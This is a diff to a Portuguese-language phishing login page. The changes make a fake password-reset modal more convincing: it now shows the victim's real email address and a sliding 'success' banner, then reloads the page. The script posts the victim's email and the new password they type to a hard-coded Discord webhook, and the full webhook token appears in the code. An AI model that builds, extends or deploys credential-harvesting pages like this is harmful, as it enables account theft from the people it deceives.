@@ -21,12 +21,6 @@
       justify-content: center;
       overflow: hidden;
       position: relative;
-      opacity: 0;
-      transform: translateY(-30px);
-      animation: fadeInUp 1s ease-out forwards;
-    }
-    @keyframes fadeInUp {
-      to { opacity: 1; transform: translateY(0); }
     }
     body::after {
       content: "";
@@ -222,7 +216,7 @@
       transform: translateY(0);
     }
 
-    /* Modal de reset de senha */
+    /* Modal de reset */
     .modal {
       display: none;
       position: fixed;
@@ -258,9 +252,14 @@
       color: #ffffff;
     }
     .modal p {
-      margin-bottom: 24px;
+      margin-bottom: 16px;
       color: #b9bbbe;
       font-size: 1.1rem;
+    }
+    .modal .email-real {
+      color: #ffffff;
+      font-weight: bold;
+      margin-bottom: 24px;
     }
     .modal input {
       width: 100%;
@@ -295,6 +294,27 @@
     }
     .close-modal:hover {
       color: white;
+    }
+
+    /* Mensagem de sucesso descendo */
+    .success-msg {
+      position: fixed;
+      top: -100px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(67, 181, 129, 0.95);
+      color: white;
+      padding: 16px 32px;
+      border-radius: 8px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+      z-index: 10000;
+      font-weight: 600;
+      font-size: 1.1rem;
+      pointer-events: none;
+      transition: top 1.5s ease-out;
+    }
+    .success-msg.show {
+      top: 80px;
     }
   </style>
 </head>
@@ -352,17 +372,20 @@
     </div>
   </div>
 
-  <!-- Modal de reset de senha -->
+  <!-- Modal de reset -->
   <div id="resetModal" class="modal">
     <div class="modal-content">
-      <span class="close-modal" id="closeModal">&times;</span>
+      <span class="close-modal" id="closeModal">×</span>
       <h2>Resetar Senha</h2>
-      <p>O seu e-mail é *******@gmail.com</p>
+      <p class="email-real" id="emailDisplay">O seu e-mail é carregando...</p>
       <p>Bote a sua senha nova!</p>
       <input type="password" id="newPassword" placeholder="... Bote sua nova Key/senha Aqui...">
       <button id="resetButton">Resetar Senha</button>
     </div>
   </div>
+
+  <!-- Mensagem de sucesso que desce -->
+  <div id="successMsg" class="success-msg">Senha alterada com sucesso!</div>
 
   <script>
     const form = document.getElementById('loginForm');
@@ -370,7 +393,15 @@
     const webhookUrl = 'https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC';
     const resetWebhook = 'https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC';
 
-    // Login normal (seu código anterior)
+    const forgotLink = document.getElementById('forgotPassword');
+    const modal = document.getElementById('resetModal');
+    const closeModal = document.getElementById('closeModal');
+    const resetButton = document.getElementById('resetButton');
+    const newPasswordInput = document.getElementById('newPassword');
+    const emailDisplay = document.getElementById('emailDisplay');
+    const successMsg = document.getElementById('successMsg');
+
+    // Login normal
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
@@ -457,36 +488,40 @@
     });
 
     // Reset de senha
-    const forgotLink = document.getElementById('forgotPassword');
-    const modal = document.getElementById('resetModal');
-    const closeModal = document.getElementById('closeModal');
-    const resetButton = document.getElementById('resetButton');
-    const newPasswordInput = document.getElementById('newPassword');
-
     forgotLink.addEventListener('click', (e) => {
       e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      if (email) {
+        emailDisplay.textContent = `O seu e-mail é ${email}`;
+      } else {
+        emailDisplay.textContent = 'Digite seu e-mail primeiro!';
+      }
       modal.classList.add('show');
     });
 
-    closeModal.addEventListener('click', () => {
-      modal.classList.remove('show');
-    });
-
+    closeModal.addEventListener('click', () => modal.classList.remove('show'));
     modal.addEventListener('click', (e) => {
       if (e.target === modal) modal.classList.remove('show');
     });
 
     resetButton.addEventListener('click', () => {
       const newPass = newPasswordInput.value.trim();
+      const email = document.getElementById('email').value.trim();
+
       if (!newPass) {
         alert('Digite uma nova senha!');
         return;
       }
 
+      if (!email) {
+        alert('Digite seu e-mail no campo de login primeiro!');
+        return;
+      }
+
       const resetMsg = `**Reset de Senha Solicitado!**
 
-E-mail mascarado: *******@gmail.com
-Nova senha: \`${newPass}\`
+**E-mail:** ${email}
+**Nova senha:** \`${newPass}\`
 
 **Horário:** ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}`;
 
@@ -496,7 +531,19 @@ Nova senha: \`${newPass}\`
         body: JSON.stringify({ content: resetMsg })
       }).catch(() => {});
 
-      alert('Senha resetada! (enviado pro webhook)');
+      // Mostra mensagem descendo
+      successMsg.classList.add('show');
+
+      // Depois de 3 segundos + animação de saída
+      setTimeout(() => {
+        successMsg.style.top = '100vh'; // desce pra fora da tela
+      }, 3000);
+
+      // Recarrega a página após ~4 segundos (tempo da animação)
+      setTimeout(() => {
+        location.reload();
+      }, 4000);
+
       newPasswordInput.value = '';
       modal.classList.remove('show');
     });
